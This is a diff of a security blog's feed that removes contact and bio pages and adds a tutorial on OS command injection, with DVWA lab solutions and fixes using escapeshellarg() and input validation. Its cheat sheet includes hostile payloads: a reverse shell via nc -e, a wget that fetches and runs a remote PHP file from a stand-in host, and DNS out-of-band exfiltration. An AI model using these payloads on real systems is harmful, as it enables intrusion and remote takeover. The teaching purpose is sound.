@@ -10,136 +10,6 @@
     <id>https://sakibulalikhan.pages.dev</id>
 
     <entry>
-        <title>Contact</title>
-        <author>
-            <name>Sakibul Ali Khan</name>
-        </author>
-        <link href="https://sakibulalikhan.pages.dev/contact.html"/>
-        <id>https://sakibulalikhan.pages.dev/contact.html</id>
-
-        <updated>2024-08-18T02:20:20+06:00</updated>
-            <summary></summary>
-        <content type="html">
-            <![CDATA[
-                <article class="post"><header class="post__header">
-<p> </p>
-</header>
-<div class="post__inner">
-<div class="post__entry"><form id="captcha-form" action="https://formsubmit.co/383c488b21165b2620d72df1c55cb982" method="post">
-<div style="margin-bottom: 1.25rem; display: flex;">
-<div style="flex: 1;"><label for="first_name">First Name:</label> <input id="first_name" style="width: 100%;" maxlength="50" name="first_name" required="" type="text"></div>
-<div style="flex: 1; margin-left: 1rem;"><label for="last_name">Last Name:</label> <input id="last_name" style="width: 100%;" maxlength="50" name="last_name" required="" type="text"></div>
-</div>
-<div style="margin-bottom: 1.25rem;"><label for="email_addr">Email address:</label> <input id="email_addr" style="width: 100%;" maxlength="50" name="email" required="" type="email"></div>
-<div style="margin-bottom: 1.25rem;"><label for="message">Message:</label> <textarea id="message" style="width: 100%;" name="message" rows="5"></textarea></div>
-<div style="margin-bottom: 1.25rem;"><label id="captcha-question">Please solve: 6 + 8 =</label> <input id="captcha" style="width: 20%;" maxlength="2" required="" type="number" data-answer="14"></div>
-<input name="_captcha" type="hidden" value="false"> <input name="_subject" type="hidden" value="Mail From Offensive Blog!"> <input name="_next" type="hidden" value="https://sakibulalikhan.pages.dev/thank-you"> <button style="color: white; padding: 0.75rem 2rem; border: none; border-radius: 5px; cursor: pointer;" type="submit">Send</button></form>
-<p>
-<script>document.getElementById("captcha-form").onsubmit = function() {
-		return validateCaptcha();
-	}
-
-	function generateCaptcha() {
-		const num1 = Math.floor(Math.random() * 10);
-		const num2 = Math.floor(Math.random() * 10);
-		const operator = Math.random() < 0.5 ? '+' : '-';
-
-		document.getElementById('captcha-question').textContent = `Please solve: ${num1} ${operator} ${num2} =`;
-		document.getElementById('captcha').setAttribute('data-answer', operator === '+' ? num1 + num2 : num1 - num2);
-	}
-
-	function validateCaptcha() {
-		const userAnswer = parseInt(document.getElementById('captcha').value);
-		const correctAnswer = parseInt(document.getElementById('captcha').getAttribute('data-answer'));
-
-		if (userAnswer !== correctAnswer) {
-			alert('Captcha is incorrect. Please try again.');
-			return false;
-		}
-
-		return true;
-	}
-
-	generateCaptcha();</script>
-</p>
-</div>
-</div>
-</article>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>Thank You</title>
-        <author>
-            <name>Sakibul Ali Khan</name>
-        </author>
-        <link href="https://sakibulalikhan.pages.dev/thank-you.html"/>
-        <id>https://sakibulalikhan.pages.dev/thank-you.html</id>
-
-        <updated>2024-08-18T02:17:24+06:00</updated>
-            <summary>
-                <![CDATA[
-                    Thanks For Your Message... I appreciate you reaching out to me. Your message has been received. Home
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                <div class="container align-center">
-<p class="align-left"><code>Thanks For Your Message...</code></p>
-<p class="text-center msg msg--highlight  msg--success">I appreciate you reaching out to me. Your message has been received.</p>
-<p><a href="https://sakibulalikhan.pages.dev/" class="btn btn--outline">Home</a></p>
-</div>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>About Me</title>
-        <author>
-            <name>Sakibul Ali Khan</name>
-        </author>
-        <link href="https://sakibulalikhan.pages.dev/about.html"/>
-        <id>https://sakibulalikhan.pages.dev/about.html</id>
-
-        <updated>2024-08-18T02:07:04+06:00</updated>
-            <summary>
-                <![CDATA[
-                    Greetings! I'm a penetration tester and security enthusiast who has always been curious to learn hacking at an early age. I love to share my&hellip;
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                <figure class="post__image post__image--center"><img decoding="async" loading="lazy"  src="file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/my-about-img-md.png" alt="Sakibul Ali Khan" width="170" height="199" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-xs.png 300w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-sm.png 480w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-md.png 768w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-lg.png 1024w"></figure>
-<p><em>Greetings! I'm a penetration tester and security enthusiast who has always been curious to learn hacking at an early age. I love to share my knowledge with others, and this helps me to solidify my concepts. I created this blog to share my knowledge with beginners and enthusiasts so they can learn what I know, as it's a great thing. I have learned from the community, and this is the least I can do to help others. I'm planning to give a lot more to the community in the future.</em></p>
-<p><strong>Skills:</strong></p>
-<ul>
-<li>Penetration Testing.</li>
-<li>Vulnerability Assessment.</li>
-<li>Linux System Administration.</li>
-<li>Capture The Flag.</li>
-</ul>
-<p><strong>Interests:</strong></p>
-<ul>
-<li>DevSecOps.</li>
-<li>Cloud Pentesting.</li>
-<li>Red Teaming.</li>
-</ul>
-<p><strong>About me:</strong> </p>
-<p>I'm Sakibul Ali Khan, an Independent Security Researcher and <a href="https://yogosha.com/hackers/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">Yogosha Strike Force (YSF)</a> member, who is deeply dedicated to Red Teaming. With experience in national and international Capture The Flag (CTF) competitions, I've been a finalist in major national CTFs, providing me with valuable insights into the world of cybersecurity.<br><br>My academic journey centers around Computer Science, where I'm acquiring Python, C, and Bash programming skills. I enjoy hands-on learning, having tackled various challenges on platforms like TryHackMe, HackTheBox, and CTFtime. Proficient in Linux and familiar with tools such as Metasploit, Burpsuite, and Nmap, I navigate the cyber world with confidence.</p>
-<p><strong>Connect with me:</strong></p>
-<ul>
-<li>Twitter: <a href="https://twitter.com/sakibulalikhan" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">@sakibulalikhan</a></li>
-<li>LinkedIn: <a href="https://www.linkedin.com/in/sakibulalikhan/" target="null" class="extlink extlink-icon-5 "  title="sakibulalikhan" >Sakibul Ali Khan</a></li>
-<li>Github: <a href="https://github.com/sakibulalikhan" target="null" class="extlink extlink-icon-5 "  title="sakibulalikhan" >sakibulalikhan</a></li>
-<li>Medium: <a href="https://sakibulalikhan.medium.com/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">@sakibulalikhan</a></li>
-</ul>
-<p> </p>
-<p>
-<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="sakibulalikhan" data-color="#d67729" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00"></script>
-</p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
         <title>File Upload Bypass: Understanding and Mitigating Risks in Web Applications</title>
         <author>
             <name>Sakibul Ali Khan</name>
@@ -920,6 +790,863 @@ print(plaintext)
 </div>
 <div class="cl-preview-section">
 <p>Command Injection vulnerabilities, such as the one demonstrated in this lab, underscore the critical importance of input validation and sanitization in web application development. Failure to properly handle user input can open the door to malicious exploitation, potentially leading to serious security breaches and compromise of sensitive systems. It’s imperative for developers to implement robust security measures, including input validation and segregation of commands, to mitigate the risks associated with Command Injection attacks.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Exploring OS Command Injection: Understanding and Hands-On Practice</title>
+        <author>
+            <name>Sakibul Ali Khan</name>
+        </author>
+        <link href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html"/>
+        <id>https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html</id>
+        <media:content url="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" medium="image" />
+            <category term="Web Security"/>
+            <category term="Pentesting"/>
+            <category term="OWASP 10"/>
+            <category term="Command Injection"/>
+
+        <updated>2024-02-12T05:12:16+06:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" />
+                    Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" class="type:primaryImage" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" /></p>
+                <div class="cl-preview-section">
+<p>Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll delve into the intricacies of OS Command Injection, providing both theoretical insights and practical demonstrations to equip pentesters and bug hunters with the knowledge and skills needed to identify and mitigate this vulnerability effectively. Let’s dive in!</p>
+</div>
+<div class="cl-preview-section">
+<h2 id="part-1-understanding-os-command-injection">Part 1: Understanding OS Command Injection</h2>
+</div>
+<div class="cl-preview-section">
+<h3 id="what-is-os-command-injection"><figure class="post__image"><img decoding="async" loading="lazy"  style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal); outline: 3px solid rgba(var(--color-primary-rgb), 0.55) !important;" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="597" height="313" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-lg.png 1024w"></figure></h3>
+<h3>What is OS Command Injection?</h3>
+</div>
+<div class="cl-preview-section">
+<p>OS Command Injection is a type of vulnerability where attackers can execute arbitrary commands on the underlying operating system by manipulating user-supplied input that is passed to system shell commands. This vulnerability arises when web applications incorporate user input directly into command strings without proper validation or sanitization.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="impact-of-os-command-injection">Impact of OS Command Injection</h3>
+</div>
+<div class="cl-preview-section">
+<p>The consequences of OS Command Injection can be severe, potentially leading to unauthorized access, data exfiltration, or even full control over the target system. Attackers can leverage this vulnerability to execute commands with the privileges of the vulnerable application, posing significant risks to the security and integrity of the system.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="distinguishing-os-command-injection-from-other-injection-attacks">Distinguishing OS Command Injection from Other Injection Attacks</h3>
+</div>
+<div class="cl-preview-section">
+<p>It’s essential to differentiate OS Command Injection from other injection attacks, such as Code Injection. While Code Injection involves injecting and executing arbitrary code within the application context, OS Command Injection focuses on manipulating system commands executed by the underlying operating system.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="real-world-examples">Real-World Examples</h3>
+</div>
+<div class="cl-preview-section">
+<p>We explore real-world instances of OS Command Injection vulnerabilities, including notable cases like CVE-2021-25296 in NagiosXI and CVE-2023-29084 in ManageEngine ADManagerPlus. These examples underscore the critical importance of identifying and addressing OS Command Injection vulnerabilities to mitigate security risks.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="preventive-measures">Preventive Measures</h3>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="525" height="246" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-lg.png 1024w"></figure>
+</div>
+<div class="cl-preview-section">
+<p>Effective prevention of OS Command Injection involves implementing robust input validation, avoiding direct invocation of system shell commands whenever possible, and utilizing safe APIs for handling user input. We discuss various preventive strategies and highlight the importance of proactive security measures in mitigating this vulnerability.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="command-injection-cheatsheet">Command Injection Cheatsheet</h3>
+</div>
+<div class="cl-preview-section">
+<pre class="language-bash line-numbers"><code>--------------------------------------------------------------------
+Special Characters
+&amp;
+;
+Newline (0x0a or \n)
+&amp;&amp;
+|
+||
+command `
+$(command )
+--------------------------------------------------------------------
+Useful Commands: Linux
+whoami
+ifconfig
+ls
+uname -a
+--------------------------------------------------------------------
+Useful Commands: Windows
+whoami
+ipconfig
+dir
+ver
+--------------------------------------------------------------------
+Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
+ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
+ls %0A id
+--------------------------------------------------------------------
+Time Delay Commands
+&amp; ping -c 10 127.0.0.1 &amp;
+--------------------------------------------------------------------
+Redirecting output
+&amp; whoami &gt; /var/www/images/output.txt &amp;
+--------------------------------------------------------------------
+OOB (Out Of Band) Exploitation
+&amp; nslookup attacker-server.com &amp;
+&amp; nslookup `whoami`.attacker-server.com &amp;
+-------------------------------------------------------------------
+WAF bypasses
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+/tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
+vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+--------------------------------------------------------------------</code></pre>
+</div>
+<div class="cl-preview-section">
+<div class="cl-preview-section">
+<h2 id="part-2-hands-on-practical-demonstration">Part 2: Hands-On Practical Demonstration</h2>
+</div>
+<div class="cl-preview-section">
+<p>In this section, we do a hands-on lab solutions to demonstrate OS Command Injection techniques and detection methods. Pentesters and bug hunters can gain valuable insights into identifying and exploiting OS Command Injection vulnerabilities using practical scenarios.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="589" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-lg.png 1024w"></figure>
+<p>In this blog post, we'll explore Command Injection Vulnerabilities using DVWA version 1.10 as our playground. I've structured our exploration into two distinct phases: Attack and Securing The Code. You might wonder why I've started with the attack phase first. Well, since we have access to the source code from the beginning (assuming this is white-box testing), it makes sense to dive straight into demonstrating the attack. Later, we'll dissect the source code to understand its workings and discuss preventive measures. Let's begin by exploring the attack phase.</p>
+<h2 id="attack-phase">1. Attack Phase:</h2>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="591" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-lg.png 1024w"></figure>
+<p>In the Command Injection tab, the system prompts the user for input and specifically requests an IP address to be entered into the designated form field. This input mechanism serves as the entry point for potential exploitation through Command Injection.</p>
+<h3 id="e04b" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Low</h3>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="385" height="319" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-lg.png 1024w"></figure>
+<p>From the provided source code snippet, it's evident that the system lacks proper input validation. This means users can input any arbitrary integer or character instead of an actual IP Address. This oversight opens up the system to exploitation, as attackers can utilize various operators, also known as meta-characters, to deceive the shell into executing arbitrary commands.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="982" height="939" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-lg.png 1024w"></figure>
+<p>Once the shell executes <code>1.1.1.1;</code>, it proceeds to execute <code>pwd</code> as if it were part of the same shell command. This behavior occurs because the shell interprets the entire input string as a single command.</p>
+<h3 id="8d7c" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Medium</h3>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="539" height="422" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-lg.png 1024w"></figure>
+<p>In the provided source code snippet, you can input a random integer or any character instead of the expected IP Address. Unfortunately, the system fails to validate user input, allowing anything to be entered. Additionally, the system substitutes the characters <code>&amp;</code> and <code>;</code>, replacing them with blanks in the array through a substitution function. However, you can still employ other operators, known as meta-characters, to deceive the shell into executing arbitrary commands.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="941" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-lg.png 1024w"></figure>
+<p>Once the shell executes <code>1.1.1.1 &amp;</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 &amp;</code> as part of a single command. Consequently, the shell believes there is another command pending execution, and <code>pwd</code> is executed accordingly.</p>
+<h3 id="e69d" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: High</h3>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="546" height="519" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-lg.png 1024w"></figure>
+<p>In the provided source code, you can input a random integer or any character instead of the expected IP Address because the system lacks proper validation of user input. Consequently, users can input anything. Additionally, the admin has implemented a trim function to remove any extra spaces in the first array [0] and the last array[∞].</p>
+<p>Moreover, the system substitutes several characters, triggering a substitutions function that replaces the character with a blank in the array when inputted. However, users can only use two operators, also known as meta-characters, to manipulate the shell into executing arbitrary commands. Specifically, users can utilize <code>|</code> without any space afterward, as the system will replace <code>|</code> if extra space is used. Similarly, users can employ <code>||</code>  for this purpose.</p>
+<p><strong>But how does it work when the operator is supposedly filtered?</strong></p>
+<p>When you input <code>1.1.1.1 || pwd</code>, the additional <code>||</code> is replaced with a blank in the array. Consequently, the final payload appears as <code>1.1.1.1 || pwd</code>.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="943" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-lg.png 1024w"></figure>
+<p>After the shell executes <code>1.1.1.1 ||</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 ||</code> as part of a single command. Therefore, the shell believes there is another command pending execution, leading to the execution of <code>pwd</code>.</p>
+<h3 id="c63b" class="ny nz gr be oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bj">2. Securing The Code</h3>
+<p>To enhance the security of this Command Injection Code, there are two crucial steps you can take:</p>
+<ol>
+<li><strong>Escaping Shell Arguments</strong></li>
+</ol>
+<p>In each level of source code complexity, the <code>shell_exec()</code> PHP function is utilized without incorporating the <code>escapeshellarg()</code> function. This practice should be rectified to bolster security measures.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="720" height="388" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-lg.png 1024w"></figure>
+<p>By implementing <code>escapeshellarg()</code>, every meta-character within a string is automatically escaped, and the string itself is encapsulated within quotes. This ensures that the string can be safely passed directly to the shell, where it will be treated as a single, secure argument.</p>
+<pre class="language-php line-numbers"><code>&lt;?php
+
+// Bat Input
+if(isset($_POST['Submit'])) {
+    $target = $_REQUEST['ip'];
+
+    // Determine DS and execute the ping commend.
+    if(stristr(php_uname('s'), 'Windows NT')){
+        $cmd = shell_exec('ping ' . $target);
+    } else {
+        $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
+    }
+
+    // Feedback for the end user
+    $html .= "&lt;pre&gt; {$cmd}&lt;/pre&gt;";
+
+}
+
+?&gt;</code></pre>
+<p>Now, even the Lowest Difficulty level is fortified against vulnerabilities. It's worth noting that by incorporating <code>escapeshellarg()</code>, the Low, Medium, and High Difficulty levels can achieve heightened security without the need for additional validation. For instance, even if the user inputs something other than an IP Address format, such as "test", the system remains secure.</p>
+<p><span class="nc gs">2.</span><strong class="nc gs"> Validate user input</strong> </p>
+<p>Upon reviewing each source code difficulty, it becomes apparent that the primary objective is to ping a designated IP Address. However, in the Low, Medium, and High Difficulty levels, the failure to validate user input permits users to input arbitrary values, such as characters, instead of adhering to the expected IP Address format. Consequently, it becomes imperative to implement user input validation.</p>
+<p>When user input validation is enforced, any attempt to input values other than the expected IP Address format will be rejected by the system, triggering an error message such as "You have entered an invalid IP." This approach ensures that all input is rigorously validated, thereby sanitizing any potentially malicious input.</p>
+</div>
+<div class="cl-preview-section">
+<h2 id="conclusion">Conclusion</h2>
+</div>
+<div class="cl-preview-section">
+<p>OS Command Injection poses significant security risks to web applications, making it imperative for security professionals to understand, detect, and mitigate this vulnerability effectively. By combining theoretical understanding with hands-on practical demonstrations, pentesters and bug hunters can enhance their skills in identifying and addressing OS Command Injection vulnerabilities, ultimately strengthening the overall security posture of web applications.</p>
+</div>
+<h3 id="references-and-further-reading">References and Further Reading:</h3>
+</div>
+<div class="cl-preview-section">
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/77.html"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >CWE-77 Command Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >CWE-78 OS Command Injection</a></li>
+<li><a href="https://owasp.org/www-community/attacks/Command_Injection"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >OWASP Command Injection</a></li>
+<li><a href="https://portswigger.net/web-security/os-command-injection"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Portswigger Web Security Academy Materials &amp; Labs</a></li>
+</ul>
+<p> </p>
+</div>
+            ]]>
+        </content>
+    </entry>
+    <entry>
